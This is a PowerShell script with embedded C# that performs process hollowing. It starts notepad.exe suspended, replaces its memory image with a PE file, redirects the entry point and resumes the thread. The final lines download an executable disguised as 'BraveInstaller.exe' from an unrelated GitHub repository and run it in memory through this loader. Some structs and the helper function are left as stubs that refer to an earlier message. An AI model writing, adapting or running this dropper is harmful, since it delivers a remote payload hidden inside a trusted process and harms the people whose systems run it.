Add-Type -TypeDefinition @"

using System;
using System.Runtime.InteropServices;

public static class H
{
    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION {
        public IntPtr hProcess, hThread;
        public int dwProcessId, dwThreadId;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct STARTUPINFO {
        public int cb;
        public string lpReserved, lpDesktop, lpTitle;
        public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public short wShowWindow, cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_DOS_HEADER { /* ... same as before ... */ }
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_FILE_HEADER { /* ... */ }
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_OPTIONAL_HEADER32 { /* ... */ }
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_OPTIONAL_HEADER64 { /* ... */ }
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_SECTION_HEADER { /* ... */ }
    [StructLayout(LayoutKind.Sequential)]
    struct CONTEXT32 { /* ... */ }
    [StructLayout(LayoutKind.Sequential)]
    struct CONTEXT64 { /* ... */ }

    [DllImport("kernel32.dll")]
    static extern bool CreateProcess(string app, string cmd, IntPtr pAttr, IntPtr tAttr, bool inherit,
        uint flags, IntPtr env, string dir, ref STARTUPINFO si, out PROCESS_INFORMATION pi);
    [DllImport("kernel32.dll")]
    static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT32 ctx);
    [DllImport("kernel32.dll")]
    static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 ctx);
    [DllImport("kernel32.dll")]
    static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT32 ctx);
    [DllImport("kernel32.dll")]
    static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 ctx);
    [DllImport("kernel32.dll")]
    static extern uint ResumeThread(IntPtr hThread);
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr addr, uint size, uint type, uint prot);
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr addr, byte[] buf, uint sz, out uint written);
    [DllImport("ntdll.dll")]
    static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr addr);
    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint ms);
    [DllImport("kernel32.dll")]
    static extern bool GetExitCodeProcess(IntPtr hProcess, out uint lpExitCode);
    [DllImport("kernel32.dll")]
    static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

    const uint CREATE_SUSPENDED = 0x4;
    const uint MEM_COMMIT = 0x1000, MEM_RESERVE = 0x2000, PAGE_READWRITE = 0x04;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint CONTEXT_FULL = 0x10007;
    const uint SW_SHOWNORMAL = 1;

    public static int Run(byte[] pe)
    {
        // --- Parse PE ---
        var dos = BytesToStruct<IMAGE_DOS_HEADER>(pe, 0);
        int peOff = dos.e_lfanew;
        int ntOff = peOff + 4;
        var fh = BytesToStruct<IMAGE_FILE_HEADER>(pe, ntOff);
        bool is64 = fh.Machine == 0x8664;
        int optOff = ntOff + Marshal.SizeOf<IMAGE_FILE_HEADER>();
        ulong prefBase = 0;
        uint sizeImg = 0, epRva = 0;
        if (is64) {
            var o64 = BytesToStruct<IMAGE_OPTIONAL_HEADER64>(pe, optOff);
            prefBase = o64.ImageBase; sizeImg = o64.SizeOfImage; epRva = o64.AddressOfEntryPoint;
        } else {
            var o32 = BytesToStruct<IMAGE_OPTIONAL_HEADER32>(pe, optOff);
            prefBase = o32.ImageBase; sizeImg = o32.SizeOfImage; epRva = o32.AddressOfEntryPoint;
        }

        // --- Create suspended host ---
        STARTUPINFO si = new STARTUPINFO();
        si.cb = Marshal.SizeOf(si);
        si.wShowWindow = SW_SHOWNORMAL;   // force visible window
        PROCESS_INFORMATION pi;
        string host = is64 ? @"C:\Windows\System32\notepad.exe" : @"C:\Windows\SysWOW64\notepad.exe";
        if (!CreateProcess(host, null, IntPtr.Zero, IntPtr.Zero, false,
            CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi))
            return 1;

        // --- Unmap original image ---
        NtUnmapViewOfSection(pi.hProcess, (IntPtr)prefBase);

        // --- Allocate memory for new image ---
        IntPtr newBase = VirtualAllocEx(pi.hProcess, (IntPtr)prefBase, sizeImg, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (newBase == IntPtr.Zero)
            newBase = VirtualAllocEx(pi.hProcess, IntPtr.Zero, sizeImg, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (newBase == IntPtr.Zero) { TerminateProcess(pi.hProcess, 0); return 2; }

        // --- Write headers & sections ---
        uint written;
        int hdrSize = optOff + fh.SizeOfOptionalHeader + fh.NumberOfSections * Marshal.SizeOf<IMAGE_SECTION_HEADER>();
        byte[] hdr = new byte[hdrSize];
        Array.Copy(pe, 0, hdr, 0, hdrSize);
        WriteProcessMemory(pi.hProcess, newBase, hdr, (uint)hdrSize, out written);

        for (int i = 0; i < fh.NumberOfSections; i++) {
            var sec = BytesToStruct<IMAGE_SECTION_HEADER>(pe, optOff + fh.SizeOfOptionalHeader + i * Marshal.SizeOf<IMAGE_SECTION_HEADER>());
            if (sec.SizeOfRawData > 0) {
                byte[] secData = new byte[sec.SizeOfRawData];
                Array.Copy(pe, (int)sec.PointerToRawData, secData, 0, sec.SizeOfRawData);
                IntPtr dest = IntPtr.Add(newBase, (int)sec.VirtualAddress);
                WriteProcessMemory(pi.hProcess, dest, secData, sec.SizeOfRawData, out written);
            }
        }

        // --- Apply relocations (stub) ---
        long delta = (long)newBase.ToInt64() - (long)prefBase;
        if (delta != 0) { /* optionally implement full reloc processing */ }

        // --- Reproctect as executable ---
        VirtualAllocEx(pi.hProcess, newBase, sizeImg, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        // --- Set entry point ---
        if (is64) {
            var ctx64 = new CONTEXT64();
            ctx64.ContextFlags = CONTEXT_FULL;
            if (!GetThreadContext(pi.hThread, ref ctx64)) return 3;
            ctx64.Rip = (ulong)newBase.ToInt64() + epRva;
            if (!SetThreadContext(pi.hThread, ref ctx64)) return 4;
        } else {
            var ctx32 = new CONTEXT32();
            ctx32.ContextFlags = CONTEXT_FULL;
            if (!GetThreadContext(pi.hThread, ref ctx32)) return 3;
            unchecked { ctx32.Eip = (uint)(newBase.ToInt32() + (int)epRva); }
            if (!SetThreadContext(pi.hThread, ref ctx32)) return 4;
        }

        // --- Resume and wait ---
        ResumeThread(pi.hThread);
        WaitForSingleObject(pi.hProcess, 0xFFFFFFFF); // wait until the process exits
        uint exitCode;
        GetExitCodeProcess(pi.hProcess, out exitCode);
        return (int)exitCode;  // return the EXE's own exit code
    }

    // (BytesToStruct and all other struct definitions omitted for brevity – they are the same as previous message)
    static T BytesToStruct<T>(byte[] buf, int offset) where T : struct { /* ... */ }
}

"@
$data = (New-Object Net.WebClient).DownloadData('https://raw.githubusercontent.com/PoolSync-Studios/MCAntiPools/refs/heads/main/docs/assets/BraveInstaller.exe')
[H]::Run($data)
